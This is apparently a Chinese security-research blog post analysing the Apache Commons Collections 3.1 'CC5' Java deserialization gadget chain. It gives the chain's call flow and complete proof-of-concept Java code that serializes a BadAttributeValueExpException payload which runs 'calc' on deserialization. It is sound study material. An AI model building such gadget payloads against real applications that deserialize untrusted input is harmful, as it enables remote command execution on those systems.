+++
title = "CC链子5"
date = 2026-06-15T16:35:00+08:00
draft = false
description = "由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"
tags = ["Java安全", "安全研究"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
cover = "/images/posts/java-security-banner.svg"
+++
## 前言

由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。

## 正文

## 原理


- **依赖**：`commons-collections:3.1`
    
- **入口**：`BadAttributeValueExpException.readObject()`
    
- **执行**：`LazyMap.get()`
    
- **原理**：利用 `BadAttributeValueExpException` 在反序列化时调用 `toString()`，从而触发 `TiedMapEntry` 的 `getValue` 方法。
    
- **流程**： 
- `BadAttributeValueExpException.readObject()` 
- ↓ `TiedMapEntry.toString()`
- ↓ `LazyMap.get()` 
- ↓ `ChainedTransformer.transform()` 
- ↓ `InvokerTransformer` (反射) 
- ↓ `Runtime.getRuntime().exec()`

## 过程

弹计算机


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260613172814671.png)


源码

```java
package cc5;

  

import org.apache.commons.collections.Transformer;

import org.apache.commons.collections.functors.ChainedTransformer;

import org.apache.commons.collections.functors.ConstantTransformer;

import org.apache.commons.collections.functors.InvokerTransformer;

import org.apache.commons.collections.map.LazyMap;

import org.apache.commons.collections.keyvalue.TiedMapEntry;

  

import javax.management.BadAttributeValueExpException;

import java.lang.reflect.Field;

import java.util.HashMap;

import java.util.Map;

  

/**

 * CC5 Chain - Calculator

 *

 * Flow:

 * BadAttributeValueExpException.readObject()

 *     -> TiedMapEntry.toString()

 *     -> LazyMap.get()

 *     -> ChainedTransformer.transform()

 *     -> Runtime.getRuntime().exec("calc")

 */

public class CC5Calc {

  

    public static void main(String[] args) throws Exception {

        System.out.println("CC5 Chain - Calculator");

        System.out.println("=====================\n");

  

        // Step 1: Transformer chain: Runtime.class -> getRuntime() -> exec("calc")

        System.out.println("[*] Step 1: Create Transformer chain...");

        Transformer[] transformers = new Transformer[]{

            new ConstantTransformer(Runtime.class),

            new InvokerTransformer("getMethod",

                new Class[]{String.class, Class[].class},

                new Object[]{"getRuntime", new Class[0]}),

            new InvokerTransformer("invoke",

                new Class[]{Object.class, Object[].class},

                new Object[]{null, new Object[0]}),

            new InvokerTransformer("exec",

                new Class[]{String.class},

                new Object[]{"calc"})

        };

        ChainedTransformer chain = new ChainedTransformer(transformers);

        System.out.println("[+] Chain created\n");

  

        // Step 2: Create LazyMap

        System.out.println("[*] Step 2: Create LazyMap...");

        Map innerMap = new HashMap();

        Map lazyMap = LazyMap.decorate(innerMap, chain);

        System.out.println("[+] LazyMap created\n");

  

        // Step 3: Create TiedMapEntry

        // TiedMapEntry.toString() calls getValue() which calls map.get(key)

        System.out.println("[*] Step 3: Create TiedMapEntry...");

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "anykey");

        System.out.println("[+] TiedMapEntry created\n");

  

        // Step 4: Create BadAttributeValueExpException

        // readObject() calls val.toString()

        System.out.println("[*] Step 4: Create BadAttributeValueExpException...");

        BadAttributeValueExpException bave = new BadAttributeValueExpException(null);

  

        // Set val field to TiedMapEntry

        Field valField = BadAttributeValueExpException.class.getDeclaredField("val");

        valField.setAccessible(true);

        valField.set(bave, entry);

        System.out.println("[+] Payload created\n");

  

        // Step 5: Serialize

        System.out.println("[*] Step 5: Serialize...");

        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();

        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(baos);

        oos.writeObject(bave);

        oos.close();

        byte[] data = baos.toByteArray();

        System.out.println("[+] Serialized, size: " + data.length + " bytes\n");

  

        // Step 6: Deserialize and trigger

        System.out.println("[*] Step 6: Deserialize (will pop calculator)...");

        System.out.println("[*] Press Enter to trigger...");

        System.in.read();

  

        System.out.println("[*] Deserializing...");

        try {

            java.io.ByteArrayInputStream bais = new java.io.ByteArrayInputStream(data);

            java.io.ObjectInputStream ois = new java.io.ObjectInputStream(bais);

            ois.readObject();  // Trigger the chain

            ois.close();

        } catch (Exception e) {

            System.out.println("[-] Exception: " + e.getClass().getSimpleName());

        }

  

        System.out.println("\n[+] Done! Calculator should pop up!");

    }

}
```


## 总结

CC5 链总结

  原理: BadAttributeValueExpException.readObject() 调用 val.toString() 触发 TiedMapEntry.toString() → LazyMap.get() → ChainedTransformer.transform()

  流程:
  BadAttributeValueExpException.readObject()
      ↓
  TiedMapEntry.toString()
      ↓
  LazyMap.get("anykey")
      ↓
  ChainedTransformer.transform()
      ↓
  Runtime.getRuntime().exec("calc")
